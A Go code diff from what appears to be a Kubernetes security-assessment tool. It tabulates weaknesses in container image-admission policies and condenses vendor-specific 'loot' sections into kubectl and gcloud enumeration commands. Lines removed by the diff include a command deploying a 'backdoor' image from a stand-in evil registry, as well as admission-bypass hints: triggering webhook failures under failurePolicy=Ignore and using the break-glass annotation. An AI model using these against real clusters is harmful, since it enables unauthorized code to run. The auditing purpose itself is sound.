+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.ScanningEnabled),
+			shared.FormatBool(p.BlockOnFailure),
+			p.SeverityThreshold,
+			p.IntegrationID,
+			issuesStr,
+		})
+	}
+
+	// Build Cosign Standalone rows
+	for _, p := range cosignPolicies {
+		keyRefs := "<NONE>"
+		if len(p.KeyRefs) > 0 {
+			keyRefs = strings.Join(p.KeyRefs, ", ")
+		}
+
+		// Detect issues
+		var cosignIssues []string
+		if !p.Enabled {
+			cosignIssues = append(cosignIssues, "Policy disabled")
+		}
+		if len(p.KeyRefs) == 0 && !p.KeylessEnabled {
+			cosignIssues = append(cosignIssues, "No keys or keyless configured")
+		}
+		if !p.TransparencyLog {
+			cosignIssues = append(cosignIssues, "Transparency log disabled")
+		}
+		issuesStr := "<NONE>"
+		if len(cosignIssues) > 0 {
+			issuesStr = strings.Join(cosignIssues, "; ")
+		}
+
+		cosignRows = append(cosignRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			keyRefs,
+			shared.FormatBool(p.KeylessEnabled),
+			shared.FormatBool(p.VerifyAttestations),
+			shared.FormatBool(p.TransparencyLog),
+			issuesStr,
+		})
+	}
+
+	// Build Flux Image rows
+	for _, p := range fluxImagePolicies {
+		// Detect issues
+		var fluxIssues []string
+		if p.FilterTags == "" || p.FilterTags == "*" {
+			fluxIssues = append(fluxIssues, "No tag filter")
+		}
+		if p.Policy == "" {
+			fluxIssues = append(fluxIssues, "No policy defined")
+		}
+		issuesStr := "<NONE>"
+		if len(fluxIssues) > 0 {
+			issuesStr = strings.Join(fluxIssues, "; ")
+		}
+
+		fluxImageRows = append(fluxImageRows, []string{
+			p.Name,
+			p.Namespace,
+			p.ImageRepository,
+			p.FilterTags,
+			p.Policy,
+			p.Range,
+			issuesStr,
+		})
+	}
+
+	// Build JFrog Xray rows
+	for _, p := range xrayPolicies {
+		watchNames := "<NONE>"
+		if len(p.WatchNames) > 0 {
+			watchNames = strings.Join(p.WatchNames, ", ")
+		}
+		policyRules := "<NONE>"
+		if len(p.PolicyRules) > 0 {
+			policyRules = strings.Join(p.PolicyRules, ", ")
+		}
+
+		// Detect issues
+		var xrayIssues []string
+		if !p.Enabled {
+			xrayIssues = append(xrayIssues, "Policy disabled")
+		}
+		if !p.BlockDownloads {
+			xrayIssues = append(xrayIssues, "Downloads not blocked")
+		}
+		if len(p.WatchNames) == 0 {
+			xrayIssues = append(xrayIssues, "No watches configured")
+		}
+		issuesStr := "<NONE>"
+		if len(xrayIssues) > 0 {
+			issuesStr = strings.Join(xrayIssues, "; ")
+		}
+
+		xrayRows = append(xrayRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.SeverityThreshold,
+			shared.FormatBool(p.BlockDownloads),
+			watchNames,
+			policyRules,
+			issuesStr,
+		})
+	}
+
+	// Build Deepfence rows
+	for _, p := range deepfencePolicies {
+		// Detect issues
+		var deepfenceIssues []string
+		if !p.Enabled {
+			deepfenceIssues = append(deepfenceIssues, "Policy disabled")
+		}
+		if !p.ScanningEnabled {
+			deepfenceIssues = append(deepfenceIssues, "Scanning disabled")
+		}
+		if !p.BlockMalware {
+			deepfenceIssues = append(deepfenceIssues, "Malware not blocked")
+		}
+		issuesStr := "<NONE>"
+		if len(deepfenceIssues) > 0 {
+			issuesStr = strings.Join(deepfenceIssues, "; ")
+		}
+
+		deepfenceRows = append(deepfenceRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.ScanningEnabled),
+			p.SeverityThreshold,
+			shared.FormatBool(p.BlockMalware),
+			issuesStr,
+		})
+	}
+
+	// Build Qualys rows
+	for _, p := range qualysPolicies {
+		// Detect issues
+		var qualysIssues []string
+		if !p.Enabled {
+			qualysIssues = append(qualysIssues, "Policy disabled")
+		}
+		if !p.ScanningEnabled {
+			qualysIssues = append(qualysIssues, "Scanning disabled")
+		}
+		if !p.BlockOnCritical {
+			qualysIssues = append(qualysIssues, "Critical not blocked")
+		}
+		issuesStr := "<NONE>"
+		if len(qualysIssues) > 0 {
+			issuesStr = strings.Join(qualysIssues, "; ")
+		}
+
+		qualysRows = append(qualysRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.ScanningEnabled),
+			p.SeverityThreshold,
+			shared.FormatBool(p.BlockOnCritical),
+			issuesStr,
+		})
+	}
+
+	// Build Docker Scout rows
+	for _, p := range dockerScoutPolicies {
+		// Detect issues
+		var dockerScoutIssues []string
+		if !p.Enabled {
+			dockerScoutIssues = append(dockerScoutIssues, "Policy disabled")
+		}
+		if !p.SBOMEnabled {
+			dockerScoutIssues = append(dockerScoutIssues, "SBOM disabled")
+		}
+		if !p.PolicyCheck {
+			dockerScoutIssues = append(dockerScoutIssues, "Policy check disabled")
+		}
+		issuesStr := "<NONE>"
+		if len(dockerScoutIssues) > 0 {
+			issuesStr = strings.Join(dockerScoutIssues, "; ")
+		}
+
+		dockerScoutRows = append(dockerScoutRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.SBOMEnabled),
+			shared.FormatBool(p.PolicyCheck),
+			p.SeverityThreshold,
+			issuesStr,
+		})
+	}
+
+	// Suppress unused variable warnings for Azure policies
+	_ = azureImagePolicies
 
 	// Build allowed images rows
 	for _, entry := range allowedImages {
@@ -1126,9 +2865,20 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 			conditions = "<NONE>"
 		}
 
-		deployCmd := entry.DeployCommand
-		if deployCmd == "" {
-			deployCmd = "kubectl run test --image=<image>"
+		// Detect issues
+		var allowIssues []string
+		if !entry.SignatureRequired {
+			allowIssues = append(allowIssues, "No signature required")
+		}
+		if entry.AllowedPattern == "*" || strings.Contains(entry.AllowedPattern, "**") {
+			allowIssues = append(allowIssues, "Wildcard pattern")
+		}
+		if conditions == "<NONE>" {
+			allowIssues = append(allowIssues, "No conditions")
+		}
+		allowIssuesStr := "<NONE>"
+		if len(allowIssues) > 0 {
+			allowIssuesStr = strings.Join(allowIssues, "; ")
 		}
 
 		allowedImagesRows = append(allowedImagesRows, []string{
@@ -1139,1149 +2889,293 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 			entry.AllowedPattern,
 			sigReq,
 			conditions,
-			deployCmd,
+			allowIssuesStr,
 		})
 	}
+
+	// Build blocked images rows
+	for _, entry := range blockedImages {
+		namespaces := "<ALL>"
+		if len(entry.Namespaces) > 0 {
+			namespaces = strings.Join(entry.Namespaces, ", ")
+		}
+
+		reason := entry.Reason
+		if reason == "" {
+			reason = "Blocked by policy"
+		}
+
+		effect := entry.Effect
+		if effect == "" {
+			effect = "deny"
+		}
+
+		// Detect issues (blocked images are generally good security)
+		var blockIssues []string
+		if effect != "deny" {
+			blockIssues = append(blockIssues, "Effect not deny")
+		}
+		blockIssuesStr := "<NONE>"
+		if len(blockIssues) > 0 {
+			blockIssuesStr = strings.Join(blockIssues, "; ")
+		}
+
+		blockedImagesRows = append(blockedImagesRows, []string{
+			entry.Controller,
+			entry.PolicyName,
+			entry.Scope,
+			namespaces,
+			entry.BlockedPattern,
+			reason,
+			effect,
+			blockIssuesStr,
+		})
+	}
+
+	// Build unified policies rows
+	for _, policy := range unifiedPolicies {
+		ns := policy.Namespace
+		if ns == "" {
+			ns = "<ALL>"
+		}
+		unifiedPoliciesRows = append(unifiedPoliciesRows, []string{
+			ns,
+			policy.Tool,
+			policy.Name,
+			policy.Scope,
+			policy.Type,
+			policy.Details,
+		})
+	}
+
 
 	// Build loot
 	loot := shared.NewLootBuilder()
 
-	loot.Section("Overview").SetHeader(`#####################################
+	loot.Section("Image-Admission-Commands").SetHeader(`#####################################
 ##### Image Admission Controllers
 #####################################
 #
 # Image admission controllers verify container images before deployment
-# They can enforce:
-# - Registry allowlists/denylists
-# - Image signatures (Cosign, Notary, Sigstore)
-# - Binary authorization (attestations)
-# - Vulnerability scanning thresholds
-#
-# Bypass vectors:
-# - No image admission = deploy any image from any registry
-# - failurePolicy=Ignore = webhook failures don't block
-# - Wildcard patterns = overly permissive
-# - Unsigned image exceptions
+# They can enforce signatures, attestations, and vulnerability scanning
 #`)
 
-	loot.Section("Portieris").SetHeader(`#####################################
-##### Portieris (IBM)
-#####################################
-#
-# Image signature verification using Notary
-# Uses ImagePolicy and ClusterImagePolicy CRDs
-#
-# Policies: trust, reject, allow
-# - trust: Require valid signature
-# - reject: Block image
-# - allow: No signature required
-#`)
-
-	loot.Section("Connaisseur").SetHeader(`#####################################
-##### Connaisseur
-#####################################
-#
-# Lightweight image signature verification
-# Supports Cosign, Notary, and static signatures
-#
-# Configuration is in ConfigMap, not CRDs
-#`)
-
-	loot.Section("Ratify").SetHeader(`#####################################
-##### Ratify (Microsoft)
-#####################################
-#
-# Artifact verification framework
-# Supports signatures, SBOM, vulnerability reports
-#
-# Uses Verifier and Store CRDs
-#`)
-
-	loot.Section("Kritis").SetHeader(`#####################################
-##### Kritis (Google)
-#####################################
-#
-# Binary Authorization for GKE
-# Requires attestations from trusted attestors
-#
-# Uses AttestationAuthority and ImageSecurityPolicy CRDs
-#`)
-
-	loot.Section("Sigstore").SetHeader(`#####################################
-##### Sigstore Policy Controller
-#####################################
-#
-# Cosign signature verification using Sigstore
-# Uses ClusterImagePolicy CRDs
-#
-# Features:
-# - Cosign signature verification
-# - Keyless signing (Fulcio + Rekor)
-# - Custom key verification
-# - Attestation verification
-#`)
-
-	loot.Section("GCPBinAuth").SetHeader(`#####################################
-##### GCP Binary Authorization
-#####################################
-#
-# GKE-native image verification
-# Requires attestations from trusted attestors
-#
-# Configured at GCP project/cluster level
-# Can enforce deploy-time verification
-#`)
-
-	loot.Section("PolicyEngines").SetHeader(`#####################################
-##### Policy Engine Image Rules
-#####################################
-#
-# Kyverno, Gatekeeper, and other policy engines
-# can enforce image-related rules:
-# - Registry allowlists
-# - Image tag requirements (no :latest)
-# - Digest requirements
-#`)
-
-	loot.Section("Bypass").SetHeader(`#####################################
-##### Bypass Techniques
-#####################################
-#
-# Techniques to deploy unauthorized images
-#`)
-
-	loot.Section("ImageSources").SetHeader(`#####################################
-##### Image Source Analysis
-#####################################
-#
-# Analysis of all container images deployed in the cluster
-# Shows registry usage, tag patterns, and policy coverage
-#`)
-
-	loot.Section("PublicRegistries").SetHeader(`#####################################
-##### Public Registry Usage
-#####################################
-#
-# Public registries detected in the cluster
-# These are accessible to anyone and may contain malicious images
-#
-# Common attack vectors:
-# - Typosquatting (nginx vs nginix)
-# - Tag mutation (mutable tags like :latest)
-# - Supply chain attacks (compromised base images)
-#`)
-
-	loot.Section("PolicyGaps").SetHeader(`#####################################
-##### Policy Gaps & Weaknesses
-#####################################
-#
-# Identified gaps in image admission policies
-# These represent potential attack vectors
-#`)
-
-	loot.Section("AllowedImages").SetHeader(`#####################################
-##### Allowed Images & Deploy Commands
-#####################################
-#
-# Images/registries that can be deployed based on policies
-# Use these patterns to deploy workloads that pass admission
-#
-# Useful for:
-# - Deploying legitimate workloads
-# - Testing admission controller coverage
-# - Identifying bypass opportunities
-#`)
-
-	loot.Section("Recommendations").SetHeader(`#####################################
-##### Security Recommendations
-#####################################
-#
-# Actionable recommendations to improve image security
-#`)
-
-	loot.Section("AquaSecurity").SetHeader(`#####################################
-##### Aqua Security
-#####################################
-#
-# Aqua Kube-Enforcer provides image assurance
-# Blocks unregistered images, malware, and vulnerabilities
-#`)
-
-	loot.Section("PrismaCloud").SetHeader(`#####################################
-##### Prisma Cloud (Twistlock)
-#####################################
-#
-# Palo Alto container security platform
-# Provides vulnerability scanning and compliance checks
-#`)
-
-	loot.Section("SysdigSecure").SetHeader(`#####################################
-##### Sysdig Secure
-#####################################
-#
-# Runtime security and image scanning
-# Integrates with CI/CD pipelines
-#`)
-
-	loot.Section("NeuVector").SetHeader(`#####################################
-##### NeuVector
-#####################################
-#
-# Full lifecycle container security (now SUSE)
-# Provides admission control and runtime protection
-#`)
-
-	loot.Section("StackRox").SetHeader(`#####################################
-##### StackRox / Red Hat ACS
-#####################################
-#
-# Advanced Cluster Security for Kubernetes
-# Provides vulnerability management and compliance
-#`)
-
-	loot.Section("SnykContainer").SetHeader(`#####################################
-##### Snyk Container
-#####################################
-#
-# Developer-first security platform
-# Vulnerability scanning with fix recommendations
-#`)
-
-	loot.Section("Anchore").SetHeader(`#####################################
-##### Anchore Enterprise
-#####################################
-#
-# Policy-based container image compliance
-# Deep image inspection and policy evaluation
-#`)
-
-	loot.Section("TrivyOperator").SetHeader(`#####################################
-##### Trivy Operator
-#####################################
-#
-# Aqua's open source vulnerability scanner
-# Continuous scanning with VulnerabilityReports CRDs
-#`)
-
-	loot.Section("Kubewarden").SetHeader(`#####################################
-##### Kubewarden
-#####################################
-#
-# WebAssembly-based policy engine (CNCF)
-# Policies written in any language compiled to Wasm
-#`)
-
-	loot.Section("Notation").SetHeader(`#####################################
-##### Notation / Notary v2
-#####################################
-#
-# CNCF signing specification
-# OCI artifact signing standard
-#`)
-
-	loot.Section("Harbor").SetHeader(`#####################################
-##### Harbor Registry
-#####################################
-#
-# CNCF registry with built-in scanning
-# Supports Trivy, Clair, and Cosign
-#`)
-
-	loot.Section("AWSSigner").SetHeader(`#####################################
-##### AWS Signer
-#####################################
-#
-# AWS native container image signing
-# Integrates with ECR and EKS
-#`)
-
-	loot.Section("AzurePolicy").SetHeader(`#####################################
-##### Azure Policy for AKS
-#####################################
-#
-# Azure-native Kubernetes policy
-# Uses Gatekeeper with Azure-specific constraints
-#`)
-
-	loot.Section("Clair").SetHeader(`#####################################
-##### Clair
-#####################################
-#
-# CoreOS/Quay vulnerability scanner
-# Static analysis of container images
-#`)
-
-	// Add overview loot
 	if len(controllers) == 0 {
-		loot.Section("Overview").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Overview").Add("# [CRITICAL] NO IMAGE ADMISSION CONTROLLERS DETECTED!")
-		loot.Section("Overview").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Overview").Add("#")
-		loot.Section("Overview").Add("# Any image from any registry can be deployed to this cluster")
-		loot.Section("Overview").Add("# This includes malicious images, cryptominers, etc.")
-		loot.Section("Overview").Add("")
-		loot.Section("Overview").Add("# Deploy image from any registry:")
-		loot.Section("Overview").Add("kubectl run malicious --image=evil.registry.io/backdoor:latest")
-		loot.Section("Overview").Add("")
+		loot.Section("Image-Admission-Commands").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("Image-Admission-Commands").Add("# [CRITICAL] NO IMAGE ADMISSION CONTROLLERS DETECTED!")
+		loot.Section("Image-Admission-Commands").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("Image-Admission-Commands").Add("#")
+		loot.Section("Image-Admission-Commands").Add("# Any image from any registry can be deployed to this cluster")
+		loot.Section("Image-Admission-Commands").Add("")
+		loot.Section("Image-Admission-Commands").Add("# Deploy image from any registry:")
+		loot.Section("Image-Admission-Commands").Add("kubectl run test --image=<any-registry>/<any-image>:<any-tag>")
+		loot.Section("Image-Admission-Commands").Add("")
 	} else {
-		loot.Section("Overview").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Overview").Addf("# Detected %d image admission controller(s)", len(controllers))
-		loot.Section("Overview").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("Image-Admission-Commands").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("Image-Admission-Commands").Addf("# Detected %d image admission controller(s)", len(controllers))
+		loot.Section("Image-Admission-Commands").Add("# ═══════════════════════════════════════════════════════════")
 		for _, c := range controllers {
-			loot.Section("Overview").Addf("# - %s (%s)", c.Name, c.Type)
+			loot.Section("Image-Admission-Commands").Addf("# - %s (%s)", c.Name, c.Type)
 		}
-		loot.Section("Overview").Add("")
+		loot.Section("Image-Admission-Commands").Add("")
 	}
 
-	// Portieris loot
+	// Add enumeration commands for detected tools
 	if portierisController.Name != "" {
-		loot.Section("Portieris").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Portieris").Add("# PORTIERIS ENUMERATION")
-		loot.Section("Portieris").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Portieris").Add("")
-		loot.Section("Portieris").Add("# List ClusterImagePolicies:")
-		loot.Section("Portieris").Add("kubectl get clusterimagepolicies")
-		loot.Section("Portieris").Add("")
-		loot.Section("Portieris").Add("# List ImagePolicies (namespace-scoped):")
-		loot.Section("Portieris").Add("kubectl get imagepolicies --all-namespaces")
-		loot.Section("Portieris").Add("")
-		loot.Section("Portieris").Add("# Check Portieris pods:")
-		loot.Section("Portieris").Add("kubectl get pods -n portieris")
-		loot.Section("Portieris").Add("")
-
-		for _, policy := range portierisPolicies {
-			loot.Section("Portieris").Addf("\n# ─────────────────────────────────────────────────────────────")
-			if policy.IsClusterPolicy {
-				loot.Section("Portieris").Addf("# ClusterImagePolicy: %s", policy.Name)
-				loot.Section("Portieris").Addf("kubectl get clusterimagepolicy %s -o yaml", policy.Name)
-			} else {
-				loot.Section("Portieris").Addf("# ImagePolicy: %s (ns: %s)", policy.Name, policy.Namespace)
-				loot.Section("Portieris").Addf("kubectl get imagepolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
-			}
-			for _, repo := range policy.Repositories {
-				loot.Section("Portieris").Addf("# Repository: %s -> %s", repo.Name, repo.Policy)
-				if repo.Policy == "allow" {
-					loot.Section("Portieris").Add("# [WEAK] 'allow' policy - no signature verification")
-				}
-			}
-			loot.Section("Portieris").Add("")
-		}
-
-		if portierisController.FailurePolicy == "Ignore" {
-			loot.Section("Portieris").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("Portieris").Add("# [BYPASS] failurePolicy=Ignore - trigger webhook failure")
-			loot.Section("Portieris").Add("# ─────────────────────────────────────────────────────────────")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Portieris:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get clusterimagepolicies")
+		loot.Section("Image-Admission-Commands").Add("kubectl get imagepolicies --all-namespaces")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n portieris")
 	}
 
-	// Connaisseur loot
 	if connaisseurController.Name != "" {
-		loot.Section("Connaisseur").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Connaisseur").Add("# CONNAISSEUR ENUMERATION")
-		loot.Section("Connaisseur").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Connaisseur").Add("")
-		loot.Section("Connaisseur").Add("# Get Connaisseur configuration:")
-		loot.Section("Connaisseur").Add("kubectl get configmap connaisseur-config -n connaisseur -o yaml")
-		loot.Section("Connaisseur").Add("")
-		loot.Section("Connaisseur").Add("# Check Connaisseur pods:")
-		loot.Section("Connaisseur").Add("kubectl get pods -n connaisseur")
-		loot.Section("Connaisseur").Add("")
-
-		for _, policy := range connaisseurPolicies {
-			loot.Section("Connaisseur").Addf("# Pattern: %s -> %s", policy.Pattern, policy.Rule)
-			if policy.Rule == "allow" {
-				loot.Section("Connaisseur").Add("# [WEAK] 'allow' rule - no signature verification")
-			}
-		}
-		loot.Section("Connaisseur").Add("")
+		loot.Section("Image-Admission-Commands").Add("\n# Connaisseur:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get configmap connaisseur-config -n connaisseur -o yaml")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n connaisseur")
 	}
 
-	// Ratify loot
 	if ratifyController.Name != "" {
-		loot.Section("Ratify").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Ratify").Add("# RATIFY ENUMERATION")
-		loot.Section("Ratify").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Ratify").Add("")
-		loot.Section("Ratify").Add("# List Verifiers:")
-		loot.Section("Ratify").Add("kubectl get verifiers --all-namespaces")
-		loot.Section("Ratify").Add("")
-		loot.Section("Ratify").Add("# List Stores:")
-		loot.Section("Ratify").Add("kubectl get stores --all-namespaces")
-		loot.Section("Ratify").Add("")
-		loot.Section("Ratify").Add("# Check Ratify pods:")
-		loot.Section("Ratify").Add("kubectl get pods -n gatekeeper-system | grep ratify")
-		loot.Section("Ratify").Add("")
+		loot.Section("Image-Admission-Commands").Add("\n# Ratify:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get verifiers --all-namespaces")
+		loot.Section("Image-Admission-Commands").Add("kubectl get stores --all-namespaces")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n gatekeeper-system | grep ratify")
 	}
 
-	// Kritis loot
 	if kritisController.Name != "" {
-		loot.Section("Kritis").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kritis").Add("# KRITIS ENUMERATION")
-		loot.Section("Kritis").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kritis").Add("")
-		loot.Section("Kritis").Add("# List AttestationAuthorities:")
-		loot.Section("Kritis").Add("kubectl get attestationauthorities --all-namespaces")
-		loot.Section("Kritis").Add("")
-		loot.Section("Kritis").Add("# List ImageSecurityPolicies:")
-		loot.Section("Kritis").Add("kubectl get imagesecuritypolicies --all-namespaces")
-		loot.Section("Kritis").Add("")
-
-		for _, policy := range kritisPolicies {
-			loot.Section("Kritis").Addf("# Policy: %s (ns: %s)", policy.Name, policy.Namespace)
-			if policy.DefaultAllow {
-				loot.Section("Kritis").Add("# [WEAK] defaultAllow=true - images without attestation allowed")
-			}
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Kritis:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get attestationauthorities --all-namespaces")
+		loot.Section("Image-Admission-Commands").Add("kubectl get imagesecuritypolicies --all-namespaces")
 	}
 
-	// Sigstore loot
 	if sigstoreController.Name != "" {
-		loot.Section("Sigstore").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Sigstore").Add("# SIGSTORE POLICY CONTROLLER ENUMERATION")
-		loot.Section("Sigstore").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Sigstore").Add("")
-		loot.Section("Sigstore").Add("# List ClusterImagePolicies:")
-		loot.Section("Sigstore").Add("kubectl get clusterimagepolicies.policy.sigstore.dev")
-		loot.Section("Sigstore").Add("")
-		loot.Section("Sigstore").Add("# Check Policy Controller pods:")
-		loot.Section("Sigstore").Add("kubectl get pods -n cosign-system")
-		loot.Section("Sigstore").Add("kubectl get pods -n sigstore-system")
-		loot.Section("Sigstore").Add("")
-
-		for _, policy := range sigstorePolicies {
-			loot.Section("Sigstore").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("Sigstore").Addf("# ClusterImagePolicy: %s", policy.Name)
-			loot.Section("Sigstore").Addf("kubectl get clusterimagepolicy.policy.sigstore.dev %s -o yaml", policy.Name)
-			for _, img := range policy.Images {
-				loot.Section("Sigstore").Addf("#   Image pattern: %s", img)
-			}
-			if policy.KeylessEnabled {
-				loot.Section("Sigstore").Add("#   Uses keyless signing (Fulcio + Rekor)")
-			}
-			if len(policy.KeyRefs) > 0 {
-				loot.Section("Sigstore").Addf("#   Key refs: %s", strings.Join(policy.KeyRefs, ", "))
-			}
-			if policy.Mode == "warn" {
-				loot.Section("Sigstore").Add("#   [WEAK] Mode is 'warn' - signatures not enforced")
-			}
-			loot.Section("Sigstore").Add("")
-		}
-
-		if sigstoreController.FailurePolicy == "Ignore" {
-			loot.Section("Sigstore").Add("# ─────────────────────────────────────────────────────────────")
-			loot.Section("Sigstore").Add("# [BYPASS] failurePolicy=Ignore - trigger webhook failure")
-			loot.Section("Sigstore").Add("# ─────────────────────────────────────────────────────────────")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Sigstore Policy Controller:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get clusterimagepolicies.policy.sigstore.dev")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n cosign-system")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n sigstore-system")
 	}
 
-	// GCP Binary Authorization loot
 	if gcpBinAuthController.Name != "" {
-		loot.Section("GCPBinAuth").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("GCPBinAuth").Add("# GCP BINARY AUTHORIZATION ENUMERATION")
-		loot.Section("GCPBinAuth").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("GCPBinAuth").Add("")
-		loot.Section("GCPBinAuth").Add("# Check Binary Authorization policy (requires gcloud):")
-		loot.Section("GCPBinAuth").Add("gcloud container binauthz policy export")
-		loot.Section("GCPBinAuth").Add("")
-		loot.Section("GCPBinAuth").Add("# List attestors:")
-		loot.Section("GCPBinAuth").Add("gcloud container binauthz attestors list")
-		loot.Section("GCPBinAuth").Add("")
-		loot.Section("GCPBinAuth").Add("# Check for break-glass annotation (bypass):")
-		loot.Section("GCPBinAuth").Add("# Pods with 'alpha.image-policy.k8s.io/break-glass: true' bypass verification")
-		loot.Section("GCPBinAuth").Add("")
+		loot.Section("Image-Admission-Commands").Add("\n# GCP Binary Authorization:")
+		loot.Section("Image-Admission-Commands").Add("gcloud container binauthz policy export")
+		loot.Section("Image-Admission-Commands").Add("gcloud container binauthz attestors list")
 	}
 
-	// Policy engine loot
-	if len(policyEngineFindings) > 0 {
-		loot.Section("PolicyEngines").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("PolicyEngines").Add("# IMAGE-RELATED POLICY ENGINE RULES")
-		loot.Section("PolicyEngines").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("PolicyEngines").Add("")
-
-		for _, f := range policyEngineFindings {
-			loot.Section("PolicyEngines").Addf("# %s: %s", f.Controller, f.PolicyName)
-			loot.Section("PolicyEngines").Addf("#   Pattern: %s -> %s", f.Repository, f.Policy)
-			if f.BypassRisk != "" {
-				loot.Section("PolicyEngines").Addf("#   [RISK] %s", f.BypassRisk)
-			}
-		}
-	}
-
-	// Aqua Security loot
 	if aquaController.Name != "" {
-		loot.Section("AquaSecurity").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("AquaSecurity").Add("# AQUA SECURITY ENUMERATION")
-		loot.Section("AquaSecurity").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("AquaSecurity").Add("")
-		loot.Section("AquaSecurity").Add("# Check Aqua pods:")
-		loot.Section("AquaSecurity").Add("kubectl get pods -n aqua")
-		loot.Section("AquaSecurity").Add("")
-		loot.Section("AquaSecurity").Add("# Check Kube-Enforcer config:")
-		loot.Section("AquaSecurity").Add("kubectl get configmap aqua-enforcer-config -n aqua -o yaml")
-		loot.Section("AquaSecurity").Add("")
-		loot.Section("AquaSecurity").Add("# List Aqua security reports:")
-		loot.Section("AquaSecurity").Add("kubectl get vulnerabilityreports -A")
-		loot.Section("AquaSecurity").Add("kubectl get configauditreports -A")
-		loot.Section("AquaSecurity").Add("")
-		if aquaController.FailurePolicy == "Ignore" {
-			loot.Section("AquaSecurity").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Aqua Security:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n aqua")
+		loot.Section("Image-Admission-Commands").Add("kubectl get configmap aqua-enforcer-config -n aqua -o yaml")
+		loot.Section("Image-Admission-Commands").Add("kubectl get vulnerabilityreports -A")
 	}
 
-	// Prisma Cloud loot
 	if prismaController.Name != "" {
-		loot.Section("PrismaCloud").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("PrismaCloud").Add("# PRISMA CLOUD (TWISTLOCK) ENUMERATION")
-		loot.Section("PrismaCloud").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("PrismaCloud").Add("")
-		loot.Section("PrismaCloud").Add("# Check Twistlock pods:")
-		loot.Section("PrismaCloud").Add("kubectl get pods -n twistlock")
-		loot.Section("PrismaCloud").Add("")
-		loot.Section("PrismaCloud").Add("# Check Defender daemonset:")
-		loot.Section("PrismaCloud").Add("kubectl get daemonset -n twistlock")
-		loot.Section("PrismaCloud").Add("")
-		loot.Section("PrismaCloud").Add("# Check admission webhook config:")
-		loot.Section("PrismaCloud").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", prismaController.WebhookName)
-		loot.Section("PrismaCloud").Add("")
-		if prismaController.FailurePolicy == "Ignore" {
-			loot.Section("PrismaCloud").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Prisma Cloud (Twistlock):")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n twistlock")
+		loot.Section("Image-Admission-Commands").Add("kubectl get daemonset -n twistlock")
+		loot.Section("Image-Admission-Commands").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", prismaController.WebhookName)
 	}
 
-	// Sysdig Secure loot
 	if sysdigController.Name != "" {
-		loot.Section("SysdigSecure").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("SysdigSecure").Add("# SYSDIG SECURE ENUMERATION")
-		loot.Section("SysdigSecure").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("SysdigSecure").Add("")
-		loot.Section("SysdigSecure").Add("# Check Sysdig pods:")
-		loot.Section("SysdigSecure").Add("kubectl get pods -n sysdig-agent")
-		loot.Section("SysdigSecure").Add("")
-		loot.Section("SysdigSecure").Add("# Check admission controller:")
-		loot.Section("SysdigSecure").Add("kubectl get pods -n sysdig-admission-controller")
-		loot.Section("SysdigSecure").Add("")
-		if sysdigController.FailurePolicy == "Ignore" {
-			loot.Section("SysdigSecure").Add("# [BYPASS] failurePolicy=Ignore - webhook failures don't block")
-		}
+		loot.Section("Image-Admission-Commands").Add("\n# Sysdig Secure:")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n sysdig-agent")
+		loot.Section("Image-Admission-Commands").Add("kubectl get pods -n sysdig-admission-controller")
 	}
 
-	// NeuVector loot
 	if neuvectorController.Name != "" {
